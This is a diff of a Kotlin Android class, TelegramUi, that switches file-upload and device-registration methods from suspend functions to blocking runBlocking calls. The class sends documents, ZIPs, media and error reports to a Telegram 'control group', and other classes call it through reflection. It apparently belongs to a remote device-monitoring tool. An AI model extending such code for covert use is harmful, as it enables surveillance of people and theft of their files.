@@ -30,7 +30,7 @@ import com.example.app.safeGet
  * - لا تُطبع التوكنات في السجلات نهائياً (يتم إخفاؤها أو قصها).
  * - قوائم التوكنات محمية بواسطة synchronized وموجودة في ذاكرة التطبيق فقط.
  * 
- * ✅ تم إصلاح دوال _api لتكون معلقة (suspend) وإزالة runBlocking.
+ * ✅ تم إصلاح دوال _api لتكون غير معلقة (non-suspend) مع استخدام runBlocking.
  * ✅ تم إضافة التحقق من وجود الملفات قبل الإرسال.
  * ✅ تم استبدال processedUpdates بـ LinkedHashSet مع تنظيف تلقائي عند الوصول للحد الأقصى.
  */
@@ -294,7 +294,7 @@ class TelegramUi(
     }
 
     // ============================================================
-    //  تنفيذ طلبات Telegram API (JSON)
+    //  تنفيذ طلبات Telegram API (JSON) - تبقى معلقة (suspend)
     // ============================================================
 
     private suspend fun apiCall(
@@ -365,8 +365,7 @@ class TelegramUi(
     }
 
     // ============================================================
-    //  ✅ تنفيذ طلبات Telegram API مع رفع الملفات (Multipart/Form-Data)
-    //  يُستخدم لإرسال المستندات والصور والصوتيات
+    //  تنفيذ طلبات Multipart - تبقى معلقة (suspend)
     // ============================================================
 
     private suspend fun apiCallMultipart(
@@ -391,12 +390,10 @@ class TelegramUi(
                 val builder = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
 
-                // إضافة المعاملات النصية
                 params.forEach { (key, value) ->
                     builder.addFormDataPart(key, value.toString())
                 }
 
-                // إضافة الملفات
                 files.forEach { (key, file) ->
                     if (file.exists() && file.isFile) {
                         builder.addFormDataPart(
@@ -458,32 +455,37 @@ class TelegramUi(
     }
 
     // ============================================================
-    //  ✅ دوال عامة للاستدعاء عبر الانعكاس (Reflection)
+    //  دوال عامة للاستدعاء عبر الانعكاس (غير معلقة - non-suspend)
     //  تستخدمها فئات أخرى مثل DailyZipper, Commands, StreamManager
-    //  تم تحويلها إلى دوال معلقة (suspend) وإزالة runBlocking
+    //  ✅ تم إزالة suspend واستخدام runBlocking
     // ============================================================
 
     /**
      * استدعاء API عام مع معاملات JSON (للانعكاس)
-     * أصبحت معلقة (suspend) لضمان عدم حظر الخيط الرئيسي.
+     * غير معلقة لضمان التوافق مع الانعكاس.
      */
-    suspend fun _api(method: String, params: Map<String, Any>): JSONObject? {
-        return apiCall(method, JSONObject(params))
+    fun _api(method: String, params: Map<String, Any>): JSONObject? {
+        return runBlocking(Dispatchers.IO) {
+            apiCall(method, JSONObject(params))
+        }
     }
 
     /**
      * استدعاء API مع رفع ملفات (Multipart) (للانعكاس)
-     * أصبحت معلقة (suspend) لضمان عدم حظر الخيط الرئيسي.
+     * غير معلقة لضمان التوافق مع الانعكاس.
      */
-    suspend fun _api(method: String, params: Map<String, Any>, files: Map<String, File>): JSONObject? {
-        return apiCallMultipart(method, params, files)
+    fun _api(method: String, params: Map<String, Any>, files: Map<String, File>): JSONObject? {
+        return runBlocking(Dispatchers.IO) {
+            apiCallMultipart(method, params, files)
+        }
     }
 
     /**
      * إرسال مستند (ملف ZIP أو أي ملف) إلى الدردشة
+     * غير معلقة لضمان التوافق مع الانعكاس.
      * تم إضافة التحقق من وجود الملف قبل الإرسال.
      */
-    suspend fun sendDocument(chatId: Long, file: File, caption: String): JSONObject? {
+    fun sendDocument(chatId: Long, file: File, caption: String): JSONObject? {
         if (!file.exists()) {
             Log.w(TAG, "File not found: ${file.absolutePath}")
             return null
@@ -497,9 +499,9 @@ class TelegramUi(
 
     /**
      * إرسال صورة إلى الدردشة
-     * تم إضافة التحقق من وجود الملف قبل الإرسال.
+     * غير معلقة لضمان التوافق مع الانعكاس.
      */
-    suspend fun sendPhoto(chatId: Long, file: File, caption: String): JSONObject? {
+    fun sendPhoto(chatId: Long, file: File, caption: String): JSONObject? {
         if (!file.exists()) {
             Log.w(TAG, "File not found: ${file.absolutePath}")
             return null
@@ -513,9 +515,9 @@ class TelegramUi(
 
     /**
      * إرسال ملف صوتي (Voice) إلى الدردشة
-     * تم إضافة التحقق من وجود الملف قبل الإرسال.
+     * غير معلقة لضمان التوافق مع الانعكاس.
      */
-    suspend fun sendVoice(chatId: Long, file: File): JSONObject? {
+    fun sendVoice(chatId: Long, file: File): JSONObject? {
         if (!file.exists()) {
             Log.w(TAG, "File not found: ${file.absolutePath}")
             return null
@@ -529,9 +531,9 @@ class TelegramUi(
 
     /**
      * إرسال ملف فيديو إلى الدردشة
-     * تم إضافة التحقق من وجود الملف قبل الإرسال.
+     * غير معلقة لضمان التوافق مع الانعكاس.
      */
-    suspend fun sendVideo(chatId: Long, file: File, caption: String): JSONObject? {
+    fun sendVideo(chatId: Long, file: File, caption: String): JSONObject? {
         if (!file.exists()) {
             Log.w(TAG, "File not found: ${file.absolutePath}")
             return null
@@ -545,9 +547,9 @@ class TelegramUi(
 
     /**
      * إرسال ملف صوتي (Audio) إلى الدردشة
-     * تم إضافة التحقق من وجود الملف قبل الإرسال.
+     * غير معلقة لضمان التوافق مع الانعكاس.
      */
-    suspend fun sendAudio(chatId: Long, file: File, caption: String): JSONObject? {
+    fun sendAudio(chatId: Long, file: File, caption: String): JSONObject? {
         if (!file.exists()) {
             Log.w(TAG, "File not found: ${file.absolutePath}")
             return null
@@ -563,7 +565,20 @@ class TelegramUi(
     //  تسجيل الأجهزة والإشعارات
     // ============================================================
 
-    suspend fun registerDevice(deviceId: String, deviceModel: String): Long? {
+    /**
+     * تسجيل جهاز جديد في مجموعة التحكم
+     * غير معلقة لضمان التوافق مع الانعكاس.
+     */
+    fun registerDevice(deviceId: String, deviceModel: String): Long? {
+        return runBlocking(Dispatchers.IO) {
+            registerDeviceSuspend(deviceId, deviceModel)
+        }
+    }
+
+    /**
+     * النسخة المعلقة من تسجيل الجهاز (تُستخدم داخلياً)
+     */
+    private suspend fun registerDeviceSuspend(deviceId: String, deviceModel: String): Long? {
         if (deviceId.isBlank()) return null
         deviceMutex.withLock {
             if (devices.containsKey(deviceId)) {
@@ -637,45 +652,46 @@ class TelegramUi(
     }
 
     // ============================================================
-    //  إرسال تقارير الأخطاء إلى Telegram (إضافة جديدة)
+    //  إرسال تقارير الأخطاء إلى Telegram
     // ============================================================
 
     /**
      * إرسال تقرير خطأ مفصل إلى مجموعة التحكم.
-     * @param errorTitle عنوان الخطأ
-     * @param errorDetails خريطة تحتوي على تفاصيل إضافية (مثل الوقت، الجهاز، الاستثناء)
+     * غير معلقة لضمان التوافق مع الانعكاس.
      */
-    suspend fun sendErrorReport(errorTitle: String, errorDetails: Map<String, Any>) {
-        try {
-            val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
-            val deviceModel = monitor?.let {
-                invokeMethod(it, "getDeviceModel") as? String ?: "Unknown"
-            } ?: "Unknown"
+    fun sendErrorReport(errorTitle: String, errorDetails: Map<String, Any>) {
+        runBlocking(Dispatchers.IO) {
+            try {
+                val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
+                val deviceModel = monitor?.let {
+                    invokeMethod(it, "getDeviceModel") as? String ?: "Unknown"
+                } ?: "Unknown"
 
-            val detailsText = errorDetails.entries.joinToString("\n") { (key, value) ->
-                "• $key: $value"
-            }
-
-            val report = """
-                ❌ <b>خطأ في التطبيق</b>
-                📌 <b>$errorTitle</b>
-                🕐 الوقت: $timeStr
-                📱 الجهاز: $deviceModel
-                
-                📋 التفاصيل:
-                $detailsText
-            """.trimIndent()
-
-            apiCall(
-                "sendMessage",
-                JSONObject().apply {
-                    put("chat_id", ctrlId)
-                    put("text", report)
-                    put("parse_mode", "HTML")
+                val detailsText = errorDetails.entries.joinToString("\n") { (key, value) ->
+                    "• $key: $value"
                 }
-            )
-        } catch (e: Exception) {
-            writeLog("Failed to send error report: ${e.message}")
+
+                val report = """
+                    ❌ <b>خطأ في التطبيق</b>
+                    📌 <b>$errorTitle</b>
+                    🕐 الوقت: $timeStr
+                    📱 الجهاز: $deviceModel
+                    
+                    📋 التفاصيل:
+                    $detailsText
+                """.trimIndent()
+
+                apiCall(
+                    "sendMessage",
+                    JSONObject().apply {
+                        put("chat_id", ctrlId)
+                        put("text", report)
+                        put("parse_mode", "HTML")
+                    }
+                )
+            } catch (e: Exception) {
+                writeLog("Failed to send error report: ${e.message}")
+            }
         }
     }
 
@@ -1327,7 +1343,7 @@ class TelegramUi(
     }
 
     // ============================================================
-    //  ✅ دوال إضافية مطلوبة للانعكاس (Reflection)
+    //  دوال إضافية مطلوبة للانعكاس (Reflection)
     // ============================================================
 
     /**
